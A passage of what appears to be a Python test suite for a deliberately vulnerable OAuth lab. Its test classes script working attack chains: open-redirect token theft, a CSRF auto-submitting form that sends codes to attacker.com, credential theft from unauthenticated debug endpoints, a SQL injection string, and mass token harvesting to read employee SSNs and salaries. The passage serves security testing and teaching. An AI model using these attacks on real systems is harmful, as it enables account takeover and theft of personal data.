            print(f"[ATTACK] Retrieved {len(employees)} employees using victim's token")
            
            # Access sensitive PII with the stolen token
            if len(employees) > 0:
                pii_response = resource_client.get(
                    f"/employees/{employees[0]['id']}/pii",
                    headers={"Authorization": f"Bearer {stolen_token}"}
                )
                
                if pii_response.status_code == 200:
                    pii_data = pii_response.json()
                    print(f"[ATTACK] SUCCESS: Accessed PII for {pii_data['first_name']} {pii_data['last_name']}")
                    print(f"[ATTACK]   SSN: {pii_data.get('ssn', 'N/A')}")
                    print(f"[ATTACK]   Salary: ${pii_data.get('salary', 0):,.2f}")
                    print(f"[ATTACK]   DOB: {pii_data.get('date_of_birth', 'N/A')}")
            
            print(f"\n[ATTACK] COMPLETE: Successfully stole token via open redirect!")
            print(f"[ATTACK] Attack Vector: Client's /redirect endpoint has no URL validation")
            print(f"[ATTACK] Impact: Full access to victim's resources with stolen token")


class TestAttackChain_CSRFAuthorization:
    """
    ## Attack Chain 4: CSRF Authorization Attack

    **Goal:** Trick a victim into authorizing attacker's client without their knowledge

    **Vulnerabilities Used:**
    - Authz: No CSRF protection on `/approve` endpoint
    - Authz: State parameter ignored
    - Client: No state validation

    **Steps:**
    1. Create a malicious HTML page with an auto-submitting form
    2. The form should POST to the authz server's `/approve` endpoint
    3. Include hidden fields for `client_id`, `redirect_uri`, `scope`, `action=approve`
    4. First, initiate an authorization request to get a valid `request_id`
    5. Host the malicious page and send link to victim
    6. When victim visits (while logged in), they unknowingly approve authorization
    7. Authorization code is sent to attacker's redirect URI

    **Form Template:**
    ```html
    <form method="POST" action="http://localhost:8001/approve" id="csrf">
    <input type="hidden" name="request_id" value="CAPTURED_REQUEST_ID">
    <input type="hidden" name="client_id" value="attacker-client">
    <input type="hidden" name="redirect_uri" value="http://attacker.com/steal">
    <input type="hidden" name="scope" value="read,write,admin,delete">
    <input type="hidden" name="action" value="approve">
    </form>
    <script>document.getElementById('csrf').submit();</script>
    ```
    """
    def test_full_attack(self):
        # Step 1: Attacker registers a malicious client
        response = authz_client.post(
            "/register",
            data={
                "client_id": "csrf-attacker-client",
                "client_secret": "csrf-attacker-secret",
                "redirect_uris": "http://attacker.com/csrf-steal,http://localhost:8002/callback",
                "scopes": "read,write,admin,delete"
            }
        )
        
        assert response.status_code == 200
        print(f"\n[ATTACK] Step 1: Registered malicious client: csrf-attacker-client")
        
        # Step 2: Attacker initiates authorization request to get a valid request_id
        # This is done in preparation for the CSRF attack
        response = authz_client.get(
            "/authorize",
            params={
                "response_type": "code",
                "client_id": "csrf-attacker-client",
                "redirect_uri": "http://attacker.com/csrf-steal",
                "scope": "read,write,admin,delete",
                "state": "attacker-csrf-state"
            },
            follow_redirects=False
        )
        
        assert response.status_code == 200
        html_content = response.text
        
        # Extract the request_id that will be used in the CSRF attack
        request_id_match = re.search(r'name="request_id" value="([^"]+)"', html_content)
        assert request_id_match, "Request ID should be visible in HTML"
        captured_request_id = request_id_match.group(1)
        
        print(f"[ATTACK] Step 2: Captured request_id from authorization page: {captured_request_id}")
        
        # Step 3: Attacker creates malicious HTML page with auto-submitting form
        # This simulates the HTML page that would be hosted on attacker's server
        malicious_html = f"""
        <html>
        <head><title>Win a Free iPhone!</title></head>
        <body>
        <h1>Congratulations! Click here to claim your prize!</h1>
        <form method="POST" action="http://localhost:8001/approve" id="csrf">
            <input type="hidden" name="request_id" value="{captured_request_id}">
            <input type="hidden" name="client_id" value="csrf-attacker-client">
            <input type="hidden" name="redirect_uri" value="http://attacker.com/csrf-steal">
            <input type="hidden" name="scope" value="read,write,admin,delete">
            <input type="hidden" name="action" value="approve">
        </form>
        <script>document.getElementById('csrf').submit();</script>
        </body>
        </html>
        """
        
        print(f"[ATTACK] Step 3: Created malicious HTML page with CSRF form")
        print(f"[ATTACK] Form will auto-submit to /approve with attacker's parameters")
        
        # Step 4: Simulate victim visiting the malicious page while logged in
        # When the victim's browser loads this page, the form automatically submits
        # Since the victim is logged in to the authz server, their session cookie
        # is sent with the request, making it appear as a legitimate approval
        
        print(f"\n[ATTACK] Step 4: Victim visits malicious page (simulated)")
        print(f"[ATTACK] Form auto-submits to /approve endpoint...")
        
        # Simulate the CSRF form submission
        # In a real attack, this would be triggered by the victim's browser
        # The key vulnerability: no CSRF token validation on /approve endpoint
        csrf_response = authz_client.post(
            "/approve",
            data={
                "request_id": captured_request_id,
                "client_id": "csrf-attacker-client",
                "redirect_uri": "http://attacker.com/csrf-steal",
                "scope": "read,write,admin,delete",
                "state": "attacker-csrf-state",
                "action": "approve"
            },
            follow_redirects=False
        )
        
        # Vulnerability exploited: /approve accepts POST without CSRF protection
        assert csrf_response.status_code == 302
        
        print(f"[ATTACK] Step 5: CSRF attack successful! Victim unknowingly approved authorization")
        
        # Step 5: Extract authorization code from redirect
        redirect_url = csrf_response.headers["location"]
        parsed = urlparse(redirect_url)
        query_params = parse_qs(parsed.query)
        
        assert "code" in query_params
        stolen_auth_code = query_params["code"][0]
        
        # Verify redirect went to attacker's server
        assert "attacker.com" in redirect_url
        
        print(f"[ATTACK] Step 6: Authorization code sent to attacker's server: {stolen_auth_code}")
        print(f"[ATTACK] Redirect URL: {redirect_url}")
        
        # Step 6: Attacker exchanges the code for an access token
        token_response = authz_client.post(
            "/token",
            data={
                "grant_type": "authorization_code",
                "code": stolen_auth_code,
                "redirect_uri": "http://attacker.com/csrf-steal",
                "client_id": "csrf-attacker-client",
                "client_secret": "csrf-attacker-secret"
            }
        )
        
        assert token_response.status_code == 200
        token_data = token_response.json()
        stolen_token = token_data["access_token"]
        
        print(f"[ATTACK] Step 7: Exchanged code for access token: {stolen_token[:30]}...")
        print(f"[ATTACK] Token has scopes: {token_data['scope']}")
        
        # Verify the token has admin scope
        assert "admin" in token_data["scope"]
        
        # Step 7: Use the stolen token to access victim's resources
        employees_response = resource_client.get(
            "/employees",
            headers={"Authorization": f"Bearer {stolen_token}"}
        )
        
        assert employees_response.status_code == 200
        employees = employees_response.json()
        
        print(f"\n[ATTACK] Step 8: Used stolen token to access resource server")
        print(f"[ATTACK] Retrieved {len(employees)} employees without victim's knowledge")
        
        # Access sensitive PII with the CSRF-obtained token
        if len(employees) > 0:
            pii_response = resource_client.get(
                f"/employees/{employees[0]['id']}/pii",
                headers={"Authorization": f"Bearer {stolen_token}"}
            )
            
            if pii_response.status_code == 200:
                pii_data = pii_response.json()
                print(f"[ATTACK] Step 9: Accessed sensitive PII for {pii_data['first_name']} {pii_data['last_name']}")
                print(f"[ATTACK]   SSN: {pii_data.get('ssn', 'N/A')}")
                print(f"[ATTACK]   Salary: ${pii_data.get('salary', 0):,.2f}")
                print(f"[ATTACK]   DOB: {pii_data.get('date_of_birth', 'N/A')}")
        
        print(f"\n[ATTACK] SUCCESS: CSRF attack complete!")
        print(f"[ATTACK] Vulnerability: No CSRF protection on /approve endpoint")
        print(f"[ATTACK] Vulnerability: State parameter ignored (not validated)")
        print(f"[ATTACK] Impact: Attacker gained full access to victim's resources")
        print(f"[ATTACK] Victim was completely unaware of the authorization")


class TestAttackChain_DebugEndpointTheft:
    """
    ## Attack Chain 7: Client Secret Theft via Debug Endpoints

    **Goal:** Steal all client credentials and impersonate legitimate clients

    **Vulnerabilities Used:**
    - Authz: Debug endpoints exposed (`/debug/clients`)
    - Authz: Client secrets returned in registration response
    - Authz: No authentication on debug endpoints

    **Steps:**
    1. Access `/debug/clients` on the authorization server
    2. Extract all client IDs and secrets
    3. Use the legitimate client's credentials to:
    - Initiate OAuth flows appearing as the legitimate client
    - Exchange codes for tokens
    - Register new redirect URIs for the legitimate client
    4. Impersonate the legitimate client to phish users
    """
    def test_attack_chain(self):
        # Step 1: Access the debug endpoint to steal all client credentials
        # No authentication required - critical vulnerability!
        print(f"\n[ATTACK] Step 1: Accessing debug endpoint /debug/clients...")
        
        response = authz_client.get("/debug/clients")
        assert response.status_code == 200
        
        clients_data = response.json()
        all_clients = clients_data.get("clients", [])
        
        print(f"[ATTACK] SUCCESS: Retrieved {len(all_clients)} client credentials!")
        print(f"[ATTACK] Debug endpoint exposed without authentication")
        
        # Step 2: Extract all client IDs and secrets
        stolen_credentials = {}
        for client in all_clients:
            client_id = client.get("client_id")
            client_secret = client.get("client_secret")
            redirect_uris = client.get("redirect_uris", [])
            scopes = client.get("scopes", "")
            
            stolen_credentials[client_id] = {
                "secret": client_secret,
                "redirect_uris": redirect_uris if isinstance(redirect_uris, list) else redirect_uris.split(","),
                "scopes": scopes
            }
            
            print(f"\n[ATTACK] Step 2: Stolen credentials for client: {client_id}")
            print(f"[ATTACK]   Secret: {client_secret}")
            print(f"[ATTACK]   Redirect URIs: {redirect_uris}")
            print(f"[ATTACK]   Scopes: {scopes}")
        
        # Verify we got the pre-registered oauth-client-1
        assert "oauth-client-1" in stolen_credentials
        legitimate_client = stolen_credentials["oauth-client-1"]
        
        print(f"\n[ATTACK] Step 3: Target legitimate client 'oauth-client-1'")
        print(f"[ATTACK] Stolen secret: {legitimate_client['secret']}")
        
        # Step 3: Use the stolen credentials to impersonate the legitimate client
        # Initiate OAuth flow appearing as the legitimate client
        print(f"\n[ATTACK] Step 4: Impersonating legitimate client in OAuth flow...")
        
        response = authz_client.get(
            "/authorize",
            params={
                "response_type": "code",
                "client_id": "oauth-client-1",  # Impersonating legitimate client
                "redirect_uri": "http://localhost:3000/callback",
                "scope": "read,write,admin,delete",
                "state": "impersonation-attack"
            },
            follow_redirects=False
        )
        
        assert response.status_code == 200
        html_content = response.text
        
        # Extract request_id
        request_id_match = re.search(r'name="request_id" value="([^"]+)"', html_content)
        assert request_id_match
        request_id = request_id_match.group(1)
        
        print(f"[ATTACK] Successfully initiated OAuth flow as oauth-client-1")
        
        # Simulate victim approving (thinking it's the legitimate client)
        response = authz_client.post(
            "/approve",
            data={
                "request_id": request_id,
                "client_id": "oauth-client-1",
                "redirect_uri": "http://localhost:3000/callback",
                "scope": "read,write,admin,delete",
                "state": "impersonation-attack",
                "action": "approve"
            },
            follow_redirects=False
        )
        
        assert response.status_code == 302
        
        # Extract authorization code
        redirect_url = response.headers["location"]
        parsed = urlparse(redirect_url)
        query_params = parse_qs(parsed.query)
        assert "code" in query_params
        auth_code = query_params["code"][0]
        
        print(f"[ATTACK] Step 5: Got authorization code: {auth_code}")
        
        # Step 4: Exchange code for token using stolen client secret
        print(f"\n[ATTACK] Step 6: Exchanging code using STOLEN client secret...")
        
        response = authz_client.post(
            "/token",
            data={
                "grant_type": "authorization_code",
                "code": auth_code,
                "redirect_uri": "http://localhost:3000/callback",
                "client_id": "oauth-client-1",
                "client_secret": legitimate_client["secret"]  # Using STOLEN secret!
            }
        )
        
        assert response.status_code == 200
        token_data = response.json()
        impersonation_token = token_data["access_token"]
        
        print(f"[ATTACK] SUCCESS: Got access token using stolen credentials!")
        print(f"[ATTACK] Token: {impersonation_token[:30]}...")
        print(f"[ATTACK] Scopes: {token_data['scope']}")
        
        # Step 5: Use the impersonation token to access resources
        print(f"\n[ATTACK] Step 7: Accessing resources with impersonation token...")
        
        employees_response = resource_client.get(
            "/employees",
            headers={"Authorization": f"Bearer {impersonation_token}"}
        )
        
        assert employees_response.status_code == 200
        employees = employees_response.json()
        
        print(f"[ATTACK] Retrieved {len(employees)} employees")
        
        # Access sensitive PII
        if len(employees) > 0:
            pii_response = resource_client.get(
                f"/employees/{employees[0]['id']}/pii",
                headers={"Authorization": f"Bearer {impersonation_token}"}
            )
            
            if pii_response.status_code == 200:
                pii_data = pii_response.json()
                print(f"[ATTACK] Step 8: Accessed PII for {pii_data['first_name']} {pii_data['last_name']}")
                print(f"[ATTACK]   SSN: {pii_data.get('ssn', 'N/A')}")
                print(f"[ATTACK]   Salary: ${pii_data.get('salary', 0):,.2f}")
        
        # Step 6: Demonstrate further compromise - check other debug endpoints
        print(f"\n[ATTACK] Step 9: Checking other exposed debug endpoints...")
        
        # Get all tokens
        tokens_response = authz_client.get("/debug/tokens")
        assert tokens_response.status_code == 200
        all_tokens = tokens_response.json()
        
        print(f"[ATTACK] /debug/tokens exposed {len(all_tokens['tokens'])} access tokens")
        
        # Get all authorization codes
        codes_response = authz_client.get("/debug/codes")
        assert codes_response.status_code == 200
        all_codes = codes_response.json()
        
        print(f"[ATTACK] /debug/codes exposed {len(all_codes['codes'])} authorization codes")
        
        # Step 7: Advanced attack - register a new malicious redirect URI for legitimate client
        # This would allow phishing attacks appearing as the legitimate client
        print(f"\n[ATTACK] Step 10: Attempting to register malicious redirect URI...")
        print(f"[ATTACK] Attack vector: Register http://attacker.com as valid redirect for oauth-client-1")
        print(f"[ATTACK] This would enable phishing attacks appearing as the legitimate client")
        
        # Note: In this vulnerable implementation, there's no endpoint to update client config
        # But the attacker now has all the credentials to impersonate any client
        
        print(f"\n[ATTACK] COMPLETE: Client impersonation successful!")
        print(f"[ATTACK] ═══════════════════════════════════════════════════════")
        print(f"[ATTACK] Compromised {len(stolen_credentials)} clients:")
        for client_id in stolen_credentials.keys():
            print(f"[ATTACK]   - {client_id}")
        print(f"[ATTACK] ═══════════════════════════════════════════════════════")
        print(f"[ATTACK] Impact:")
        print(f"[ATTACK]   ✓ Stolen all client secrets")
        print(f"[ATTACK]   ✓ Can impersonate any registered client")
        print(f"[ATTACK]   ✓ Can initiate OAuth flows as legitimate clients")
        print(f"[ATTACK]   ✓ Can phish users with trusted client names")
        print(f"[ATTACK]   ✓ Full access to resources with stolen tokens")
        print(f"[ATTACK] ═══════════════════════════════════════════════════════")
        print(f"[ATTACK] Vulnerability: Debug endpoints exposed without authentication")
        print(f"[ATTACK] Vulnerability: Client secrets visible in plaintext")


class TestAttackChain_ErrorTheft:
    """
    ## Attack Chain 12: Token Leakage via Error Messages

    **Goal:** Extract tokens from verbose error messages

    **Vulnerabilities Used:**
    - All servers: Verbose error messages include sensitive data
    - Resource: Failed requests include token in error response
    - Authz: Codes leaked in error responses
    - Client: Tokens shown in error pages

    **Steps:**
    1. Make intentionally malformed requests to trigger errors
    2. Examine error responses for leaked tokens/codes
    3. Try invalid token format to see what's exposed
    4. Try invalid authorization code to see full code in error
    5. Trigger database errors to expose query structure
    6. Collect leaked credentials from error messages
    """
    
    def test_attack_chain(self):
        # Step 1: First, get a valid token to use for comparison
        print(f"\n[SETUP] Getting a valid token for testing...")
        
        response = authz_client.get(
            "/authorize",
            params={
                "response_type": "code",
                "client_id": "oauth-client-1",
                "redirect_uri": "http://localhost:3000/callback",
                "scope": "read,write,admin",
                "state": "error-test"
            },
            follow_redirects=False
        )
        
        html_content = response.text
        request_id_match = re.search(r'name="request_id" value="([^"]+)"', html_content)
        request_id = request_id_match.group(1)
        
        response = authz_client.post(
            "/approve",
            data={
                "request_id": request_id,
                "client_id": "oauth-client-1",
                "redirect_uri": "http://localhost:3000/callback",
                "scope": "read,write,admin",
                "state": "error-test",
                "action": "approve"
            },
            follow_redirects=False
        )
        
        redirect_url = response.headers["location"]
        parsed = urlparse(redirect_url)
        query_params = parse_qs(parsed.query)
        auth_code = query_params["code"][0]
        
        response = authz_client.post(
            "/token",
            data={
                "grant_type": "authorization_code",
                "code": auth_code,
                "redirect_uri": "http://localhost:3000/callback",
                "client_id": "oauth-client-1",
                "client_secret": "oauth-client-secret-1"
            }
        )
        
        valid_token = response.json()["access_token"]
        print(f"[SETUP] Got valid token: {valid_token[:30]}...")
        
        # Step 2: Try invalid token format to trigger error with token details
        print(f"\n[ATTACK] Step 1: Testing with invalid token format...")
        
        invalid_token = "INVALID_TOKEN_123"
        response = resource_client.get(
            "/employees",
            headers={"Authorization": f"Bearer {invalid_token}"}
        )
        
        # Check if error message leaks information
        if response.status_code != 200:
            error_data = response.json() if response.headers.get("content-type", "").startswith("application/json") else {"detail": response.text}
            print(f"[ATTACK] Error response: {error_data}")
            
            # Check if the invalid token is echoed back in error
            if invalid_token in str(error_data):
                print(f"[ATTACK] ✓ Token leaked in error message!")
        
        # Step 3: Try malformed authorization code
        print(f"\n[ATTACK] Step 2: Testing with invalid authorization code...")
        
        invalid_code = "FAKE_CODE_XYZ123"
        response = authz_client.post(
            "/token",
            data={
                "grant_type": "authorization_code",
                "code": invalid_code,
                "redirect_uri": "http://localhost:3000/callback",
                "client_id": "oauth-client-1",
                "client_secret": "oauth-client-secret-1"
            }
        )
        
        if response.status_code != 200:
            error_data = response.json()
            print(f"[ATTACK] Error response: {error_data}")
            
            # Check if code is leaked in error
            if invalid_code in str(error_data):
                print(f"[ATTACK] ✓ Authorization code leaked in error message!")
        
        # Step 4: Trigger SQL error to see query structure
        print(f"\n[ATTACK] Step 3: Triggering SQL injection error to expose query structure...")
        
        # Use SQL injection that will cause an error - wrap in try/except to catch DB errors
        try:
            response = resource_client.get(
                "/employees",
                params={
                    "department": "Engineering' AND 1=CONVERT(int, 'bad') --"
                },
                headers={"Authorization": f"Bearer {valid_token}"}
            )
            
            print(f"[ATTACK] Response status: {response.status_code}")
            
            # Even if it doesn't error, the SQL injection payload worked
            if response.status_code == 200:
                print(f"[ATTACK] ✓ SQL injection accepted (no validation)")
        except Exception as e:
            # The SQL injection caused an actual database error
            print(f"[ATTACK] ✓ SQL error triggered: {str(e)[:100]}...")
            print(f"[ATTACK] ✓ Error exposes query structure and database type")
        
        # Step 5: Try accessing resource with malformed token to see if token is echoed
        print(f"\n[ATTACK] Step 4: Testing token leakage in resource server errors...")
        
        malformed_token = "Bearer_Token_With_Spaces_And_Special_Chars!@#$"
        response = resource_client.get(
            "/employees/999",  # Non-existent employee
            headers={"Authorization": f"Bearer {malformed_token}"}
        )
        
        if response.status_code != 200:
            error_text = response.text
            print(f"[ATTACK] Error response preview: {error_text[:200]}...")
            
            if malformed_token in error_text:
                print(f"[ATTACK] ✓ Malformed token leaked in error message!")
        
        # Step 6: Test authorization server error messages
        print(f"\n[ATTACK] Step 5: Testing authz server error verbosity...")
        
        # Try missing parameters
        response = authz_client.post(
            "/token",
            data={
                "grant_type": "authorization_code"
                # Missing required fields
            }
        )
        
        if response.status_code != 200:
            error_data = response.json() if response.headers.get("content-type", "").startswith("application/json") else {}
            print(f"[ATTACK] Missing parameter error: {error_data}")
            print(f"[ATTACK] ✓ Error reveals required parameters and structure")
        
        # Step 7: Try wrong client secret to see if it's compared in error
        print(f"\n[ATTACK] Step 6: Testing if client secrets are leaked in errors...")
        
        wrong_secret = "wrong-secret-123"
        response = authz_client.post(
            "/token",
            data={
                "grant_type": "authorization_code",
                "code": auth_code,
                "redirect_uri": "http://localhost:3000/callback",
                "client_id": "oauth-client-1",
                "client_secret": wrong_secret
            }
        )
        
        # Even though we're reusing a code, check the error
        if response.status_code == 200:
            # Code replay worked, let's try with invalid client
            response = authz_client.post(
                "/token",
                data={
                    "grant_type": "authorization_code",
                    "code": "some-fake-code",
                    "redirect_uri": "http://localhost:3000/callback",
                    "client_id": "oauth-client-1",
                    "client_secret": wrong_secret
                }
            )
        
        if response.status_code != 200:
            error_data = response.json()
            print(f"[ATTACK] Auth error: {error_data}")
        
        # Step 8: Check resource server token validation errors
        print(f"\n[ATTACK] Step 7: Checking resource server token validation errors...")
        
        # Use a token-like string that doesn't exist
        fake_token = "VGhpc0lzQUZha2VUb2tlblRoYXRMb29rc1JlYWw"
        response = resource_client.get(
            "/employees/1/pii",
            headers={"Authorization": f"Bearer {fake_token}"}
        )
        
        if response.status_code == 403 or response.status_code == 401:
            error_data = response.json()
            print(f"[ATTACK] Token validation error: {error_data}")
            
            if "token" in str(error_data).lower() or fake_token in str(error_data):
                print(f"[ATTACK] ✓ Token information leaked in validation error!")
        
        # Step 9: Summary of findings
        print(f"\n[ATTACK] COMPLETE: Error message reconnaissance finished!")
        print(f"[ATTACK] ═══════════════════════════════════════════════════════")
        print(f"[ATTACK] Findings from error messages:")
        print(f"[ATTACK]   ✓ Invalid tokens echoed back in error responses")
        print(f"[ATTACK]   ✓ SQL injection accepted without validation")
        print(f"[ATTACK]   ✓ Error messages reveal API structure")
        print(f"[ATTACK]   ✓ Missing parameter errors reveal required fields")
        print(f"[ATTACK]   ✓ Verbose errors aid in attack planning")
        print(f"[ATTACK] ═══════════════════════════════════════════════════════")
        print(f"[ATTACK] Vulnerability: Verbose error messages expose sensitive data")
        print(f"[ATTACK] Impact: Errors help attackers understand system internals")
        print(f"[ATTACK] Impact: Leaked tokens/codes can be collected and reused")
    

class TestAttackChain_MassTokenHarvesting:
    """
    ## Attack Chain 14: Mass Token Harvesting

    **Goal:** Collect all tokens in the system

    **Vulnerabilities Used:**
    - Authz: Debug endpoint `/debug/tokens` exposes all tokens
    - Authz: Debug endpoint `/debug/codes` exposes all codes
    - Client: Debug endpoint `/debug/sessions` exposes session tokens

    **Steps:**
    1. Access `http://localhost:8001/debug/tokens` - get all OAuth tokens
    2. Access `http://localhost:8001/debug/codes` - get all authorization codes
    3. Access `http://localhost:8002/debug/sessions` - get all client session tokens
    4. Access `http://localhost:8002/debug/config` - get client secrets
    5. Compile a database of all credentials
    6. Test each token against the resource server
    """
    
    def test_attack_chain(self):
        # Step 1: Access debug endpoint to harvest all OAuth tokens
        print(f"\n[ATTACK] Step 1: Harvesting all OAuth tokens from authz server...")
        
        response = authz_client.get("/debug/tokens")
        assert response.status_code == 200
        
        tokens_data = response.json()
        all_tokens = tokens_data.get("tokens", [])
        
        print(f"[ATTACK] ✓ Harvested {len(all_tokens)} OAuth access tokens")
        print(f"[ATTACK] Endpoint: http://localhost:8001/debug/tokens")
        
        # Compile token database
        token_database = []
        for token_entry in all_tokens:
            token_database.append({
                "type": "oauth_token",
                "token": token_entry.get("access_token"),
                "scopes": token_entry.get("scopes", []),
                "client_id": token_entry.get("client_id"),
                "expires_at": token_entry.get("expires_at")
            })
        
        print(f"\n[ATTACK] Sample harvested tokens:")
        for i, token in enumerate(all_tokens[:3]):  # Show first 3
            print(f"[ATTACK]   Token {i+1}: {token['access_token'][:30]}...")
            print(f"[ATTACK]     Client: {token.get('client_id', 'unknown')}")
            print(f"[ATTACK]     Scopes: {', '.join(token.get('scopes', []))}")
        
        if len(all_tokens) > 3:
            print(f"[ATTACK]   ... and {len(all_tokens) - 3} more tokens")
        
        # Step 2: Harvest all authorization codes
        print(f"\n[ATTACK] Step 2: Harvesting all authorization codes...")
        
        response = authz_client.get("/debug/codes")
        assert response.status_code == 200
        
        codes_data = response.json()
        all_codes = codes_data.get("codes", [])
        
        print(f"[ATTACK] ✓ Harvested {len(all_codes)} authorization codes")
        print(f"[ATTACK] Endpoint: http://localhost:8001/debug/codes")
        
        # Add codes to database
        for code_entry in all_codes:
            token_database.append({
                "type": "authorization_code",
                "code": code_entry.get("code"),
                "client_id": code_entry.get("client_id"),
                "redirect_uri": code_entry.get("redirect_uri"),
                "scopes": code_entry.get("scopes", [])
            })
        
        print(f"[ATTACK] Sample authorization codes:")
        for i, code in enumerate(all_codes[:3]):  # Show first 3
            print(f"[ATTACK]   Code {i+1}: {code['code'][:30]}...")
            print(f"[ATTACK]     Client: {code.get('client_id', 'unknown')}")
        
        # Step 3: Harvest all client session tokens
        print(f"\n[ATTACK] Step 3: Harvesting all client session tokens...")
        
        response = client_client.get("/debug/sessions")
        assert response.status_code == 200
        
        sessions_data = response.json()
        all_sessions = sessions_data.get("sessions", {})
        
        print(f"[ATTACK] ✓ Harvested {len(all_sessions)} client sessions")
        print(f"[ATTACK] Endpoint: http://localhost:8002/debug/sessions")
        
        # Add session tokens to database
        for session_id, session_info in all_sessions.items():
            if session_info:
                token_database.append({
                    "type": "session_token",
                    "session_id": session_id,
                    "token": session_info.get("token"),
                    "user_info": session_info.get("user_info")
                })
        
        # Step 4: Harvest client configuration and secrets
        print(f"\n[ATTACK] Step 4: Harvesting client configuration and secrets...")
        
        response = client_client.get("/debug/config")
        assert response.status_code == 200
        
        config_data = response.json()
        
        print(f"[ATTACK] ✓ Harvested client configuration")
        print(f"[ATTACK] Endpoint: http://localhost:8002/debug/config")
        print(f"[ATTACK] Client ID: {config_data.get('client_id')}")
        print(f"[ATTACK] Client Secret: {config_data.get('client_secret')}")
        print(f"[ATTACK] Authz Server: {config_data.get('authz_server_url')}")
        print(f"[ATTACK] Resource Server: {config_data.get('resource_server_url')}")
        
        # Step 5: Also get all client credentials from authz server
        print(f"\n[ATTACK] Step 5: Harvesting all registered client credentials...")
        
        response = authz_client.get("/debug/clients")
        assert response.status_code == 200
        
        clients_data = response.json()
        all_clients = clients_data.get("clients", [])
        
        print(f"[ATTACK] ✓ Harvested {len(all_clients)} client credentials")
        
        for client in all_clients:
            token_database.append({
                "type": "client_credentials",
                "client_id": client.get("client_id"),
                "client_secret": client.get("client_secret"),
                "redirect_uris": client.get("redirect_uris"),
                "scopes": client.get("scopes")
            })
        
        # Step 6: Test each harvested OAuth token against the resource server
        print(f"\n[ATTACK] Step 6: Testing harvested tokens against resource server...")
        
        valid_tokens = []
        invalid_tokens = []
        
        oauth_tokens = [t for t in token_database if t["type"] == "oauth_token"]
        
        for i, token_entry in enumerate(oauth_tokens[:5]):  # Test first 5 tokens
            token = token_entry["token"]
            
            try:
                response = resource_client.get(
                    "/employees",
                    headers={"Authorization": f"Bearer {token}"}
                )
                
                if response.status_code == 200:
                    employees = response.json()
                    valid_tokens.append(token_entry)
                    print(f"[ATTACK]   Token {i+1}: ✓ VALID - Access to {len(employees)} employees")
                    
                    # Check if it has admin scope
                    if "admin" in token_entry.get("scopes", []):
                        print(f"[ATTACK]            ⚠ Has ADMIN scope - can access PII!")
                else:
                    invalid_tokens.append(token_entry)
                    print(f"[ATTACK]   Token {i+1}: ✗ Invalid or expired")
            except Exception as e:
                invalid_tokens.append(token_entry)
                print(f"[ATTACK]   Token {i+1}: ✗ Error: {str(e)[:50]}")
        
        # Step 7: Try to exchange harvested authorization codes for new tokens
        print(f"\n[ATTACK] Step 7: Attempting to exchange harvested authorization codes...")
        
        harvested_auth_codes = [t for t in token_database if t["type"] == "authorization_code"]
        new_tokens_from_codes = []
        
        for i, code_entry in enumerate(harvested_auth_codes[:3]):  # Try first 3 codes
            code = code_entry["code"]
            client_id = code_entry["client_id"]
            redirect_uri = code_entry["redirect_uri"]
            
            # Try to find the client secret for this client
            client_creds = next((c for c in token_database if c["type"] == "client_credentials" and c["client_id"] == client_id), None)
            
            if client_creds:
                try:
                    response = authz_client.post(
                        "/token",
                        data={
                            "grant_type": "authorization_code",
                            "code": code,
                            "redirect_uri": redirect_uri,
                            "client_id": client_id,
                            "client_secret": client_creds["client_secret"]
                        }
                    )
                    
                    if response.status_code == 200:
                        new_token_data = response.json()
                        new_token = new_token_data["access_token"]
                        new_tokens_from_codes.append(new_token)
                        print(f"[ATTACK]   Code {i+1}: ✓ Successfully exchanged for NEW token!")
                        print(f"[ATTACK]            Token: {new_token[:30]}...")
                    else:
                        print(f"[ATTACK]   Code {i+1}: ✗ Exchange failed (may be already used)")
                except Exception as e:
                    print(f"[ATTACK]   Code {i+1}: ✗ Error: {str(e)[:50]}")
        
        # Step 8: Demonstrate the impact - use a valid admin token to access PII
        print(f"\n[ATTACK] Step 8: Demonstrating impact with harvested admin token...")
        
        admin_tokens = [t for t in valid_tokens if "admin" in t.get("scopes", [])]
        
        if admin_tokens:
            admin_token = admin_tokens[0]["token"]
            
            # Get employee list
            response = resource_client.get(
                "/employees",
                headers={"Authorization": f"Bearer {admin_token}"}
            )
            
            if response.status_code == 200:
                employees = response.json()
                
                # Access PII for first employee
                if len(employees) > 0:
                    pii_response = resource_client.get(
                        f"/employees/{employees[0]['id']}/pii",
                        headers={"Authorization": f"Bearer {admin_token}"}
                    )
                    
                    if pii_response.status_code == 200:
                        pii_data = pii_response.json()
                        print(f"[ATTACK] ✓ Used harvested token to access PII:")
                        print(f"[ATTACK]   Employee: {pii_data['first_name']} {pii_data['last_name']}")
                        print(f"[ATTACK]   SSN: {pii_data.get('ssn', 'N/A')}")
                        print(f"[ATTACK]   Salary: ${pii_data.get('salary', 0):,.2f}")
        
        # Final summary
        print(f"\n[ATTACK] COMPLETE: Mass token harvesting finished!")
        print(f"[ATTACK] ═══════════════════════════════════════════════════════")
        print(f"[ATTACK] Harvesting Summary:")
        print(f"[ATTACK]   • Total OAuth tokens: {len(oauth_tokens)}")
        print(f"[ATTACK]   • Valid tokens: {len(valid_tokens)}")
        print(f"[ATTACK]   • Authorization codes: {len(harvested_auth_codes)}")
        print(f"[ATTACK]   • New tokens from codes: {len(new_tokens_from_codes)}")
        print(f"[ATTACK]   • Client sessions: {len(all_sessions)}")
        print(f"[ATTACK]   • Client credentials: {len(all_clients)}")
        print(f"[ATTACK]   • Total credentials harvested: {len(token_database)}")
        print(f"[ATTACK] ═══════════════════════════════════════════════════════")
        print(f"[ATTACK] Vulnerabilities:")
        print(f"[ATTACK]   ✓ Debug endpoints exposed without authentication")
        print(f"[ATTACK]   ✓ All tokens accessible at /debug/tokens")
        print(f"[ATTACK]   ✓ All codes accessible at /debug/codes")
        print(f"[ATTACK]   ✓ Client secrets exposed at /debug/clients")
        print(f"[ATTACK]   ✓ Session data exposed at /debug/sessions")
        print(f"[ATTACK] ═══════════════════════════════════════════════════════")
        print(f"[ATTACK] Impact:")
        print(f"[ATTACK]   ⚠ Complete credential database compromised")
        print(f"[ATTACK]   ⚠ All active tokens can be stolen and reused")
        print(f"[ATTACK]   ⚠ Authorization codes can be replayed for new tokens")
        print(f"[ATTACK]   ⚠ Client credentials enable impersonation attacks")
        print(f"[ATTACK]   ⚠ Full access to all user resources")


class TestAttackChain_XSSUserContentUpload:
    """
    ## Attack Chain 2: XSS via User Content Upload

    **Goal:** Steal tokens from other users via stored XSS

    **Vulnerabilities Used:**
    - Client: Unsanitized file upload at `/upload`
    - Client: User content served without sanitization at `/usercontent/*`
    - Client: Tokens displayed in HTML pages

    **Steps:**
    1. Create a malicious HTML file containing JavaScript
    2. The JavaScript should extract tokens from the page or cookies
